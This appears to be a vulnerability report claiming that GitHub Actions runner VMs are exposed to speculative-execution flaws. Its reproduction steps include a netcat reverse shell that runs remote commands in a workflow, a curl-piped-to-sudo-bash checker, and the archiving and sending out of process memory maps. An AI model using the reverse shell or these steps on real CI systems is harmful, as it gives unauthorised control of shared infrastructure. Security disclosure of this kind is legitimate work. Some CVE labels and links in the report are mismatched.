#### Side-channel analysis of Kernel & VM used in Actions Workflows shows vulnerability to Speculative Store Bypass & Rogue System Register Read.

_A result of conducting exploratory vulnerability research into the Kernel, Virtual machine & Network of the Github Actions systems._
- - -

### Overview

Github Actions "Virtual Machines" on Linux Kernel 5.8.0-1036-azure_x86_64 mount with parameters vulnerable to both a **Speculative Store Bypass, Variant 4 [CVE-2018-3640](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-3640)** & **Rogue System Register Read, Variant 3a [CVE-2018-3639](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-3640)**. Both SSB & RSRR are variants of the **Meltdown & Spectre Side-Channel Vulnerabilities** [Alert (TA18-004A)](https://us-cert.cisa.gov/ncas/alerts/TA18-004A).

I have confirmed these issues in three manner; first, transiently while conducting exploratory vulnerability research into the Kernel & Virtual machine used by workflow steps in the Github Actions systems, then intentionally with a [purposed tool](https://github.com/speed47/spectre-meltdown-checker) for analyzing [transient execution vulnerabilities](https://en.wikipedia.org/wiki/Transient_execution_CPU_vulnerability) against a systems kernel, and finally with the [official repository for testing meltdown](https://github.com/IAIK/meltdown) released by the researchers whom published [Meltdown: Reading Kernel Memory from User Space](https://meltdownattack.com/meltdown.pdf).

It's after all three of these confirmations do I feel my assumptions tilt further towards assertions, this is despite ultimately remaining the former; even though often spoken as the latter. 


## Reproducing all three "confirmations"
> _Attached is DEMO.mp4 demonstrating all three confirmation methods using a reverse shell_

**The easiest way is to request [access to this repository](https://github.com/solo-fish/SSB_GH_ACTIONS)**

Alternatively, use your own method for **binding a reverse shell**. In most cases this just requires a host with network access & the original `nc` which ships with every major distribution of linux.

On your host run the following:
```bash
$  sudo nc -lvkw 580 MY-SERVER.com 443
> Listening on MY-SERVER.com 443
```

Now we can attach a client to `MY-SERVER.com` & redirect the input it receives to a shell. 

In an existing or new github repo add the following workflow step.
```yml
name: reverse-shell
on:
  workflow_dispatch:

jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v2
      - name: reverse-shell
        run: |
          bash <(nc -v MY-SERVER.com 443)
```
You're done; execute this workflow step & wait for confirmation that the Actions container has connected to your server. Once connected, anything entered in your servers shell will be executed with `bash` on the Actions container.

## Confirmation 1

While creating iterative patches (example attached) from a myriad of information about the actions kernel I noticed that `/proc/$$/status` contains the vulnerable flag added in [torvalds/linux@d93e5e2](https://github.com/torvalds/linux/commit/d93e5e2d03d4f41dfedb92200a2c0413ab8ee4e7) with the specific purpose of _alerting userspace to the active Kernel vulnerability_.

```
Speculation_Store_Bypass:	vulnerable
```
> [Read more about the `/proc` filesystem](https://www.kernel.org/doc/html/latest/filesystems/proc.html?highlight=smaps_rollup#)

Additionally, the extended feature flags on the cpu-set show that the SSB protections are not enabled & the CPU class is a vulnerable type.
```
   brand = "Intel(R) Xeon(R) CPU E5-2673 v4 @ 2.30GHz"
   extended feature flags (7):
	SSBD: speculative store bypass disable   = false
```
These were the first observations; personally, this would be enough for me to immediately mitigate were it my host.

### Reproduce
Execute & retrieve the output of the following from Github Actions workflow.
```bash
#!/bin/bash
sudo apt install cpuid
results_folder=${1:-"results"}
mkdir -p ${results_folder}
sudo cat /proc/self/maps -vv > ${results_folder}/memory_maps.proc.self
sudo cat /proc/1/maps > ${results_folder}/memory_maps.proc.1
sudo cat /proc/$$/maps > ${results_folder}/memory_maps.proc.u
sudo cat /proc/self/status > ${results_folder}/status.proc.self
sudo cat /proc/1/status > ${results_folder}/status.proc.1
sudo cat /proc/$$/status > ${results_folder}/status.proc.u
sudo cpuid > ${results_folder}/cpu.stats

tar cf  ${results_folder}.tar.xz ${results_folder}/

# Now extract the tarball to a host you can inspect it on, one-way is to use wormhole to create a tunnel between the Actions host & your development machine
# Example
sudo apt install wormhole
wormhole send ${results_folder}.tar.xz

```
Then inspect the output however most convenient, I've attached copies of these various outputs from a random actions execution.


## Confirmation 2

A more targeted approach, the repository [spectre-meltdown-checker](https://github.com/speed47/spectre-meltdown-checker) is made to identify fifteen all fifteen known meltdown & spectre variants.

```bash
CVE-2018-3640 aka 'Variant 3a, rogue system register read'
	* CPU microcode mitigates the vulnerability:  NO 
> STATUS:  VULNERABLE
  
CVE-2018-3639 aka 'Variant 4, speculative store bypass'
		* Mitigated according to the /sys interface:  NO  (Vulnerable)
		* Kernel supports disabling speculative store bypass (SSB):  YES  (found in /proc/self/status)
		* SSB mitigation is enabled and active:  NO 
> STATUS:  VULNERABLE

```

### Reproduce
Execute & view the output of this line of bash code in a Github Actions workflow:
```bash
curl -sS https://raw.githubusercontent.com/speed47/spectre-meltdown-checker/master/spectre-m
eltdown-checker.sh | sudo bash
```
Wait, or follow the instructions laid out in the [source repo](https://github.com/speed47/spectre-meltdown-checker), to quote them:
> You never blindly run scripts you downloaded from the Internet, do you?

### Confirmation 3

Now testing with the official repository cited in [Meltdown: Reading Kernel Memory from User Space](https://meltdownattack.com/meltdown.pdf).

I thought of testing meltdown further, however, after viewing the code & the warnings provided on the repository I deemed it unsafe for both Github's Infrastructure & Users.

>  If you find that a computer is susceptible to the Meltdown bug, you may want to avoid using it as a **multi-user system**. Meltdown breaches the CPU's memory protection. On a machine that is susceptible to the Meltdown bug, one process can read all pages used by other processes or by the kernel. This code is only for testing purposes. Do not run it on any productive systems. Do not run it on any system that might be used by another person or entity.

### Reproduce
Running the first testset from `meltdown`

```
git clone https://github.com/IAIK/meltdown.git
cd meltdown/libkdump
make
sudo make install
cd ..
make
taskset 0x1 ./test
```
We get the correct ouput
```
Expect: Welcome to the wonderful world of microarchitectural attacks
   Got: Welcome to the wonderful world of microarchitectural attacks
```
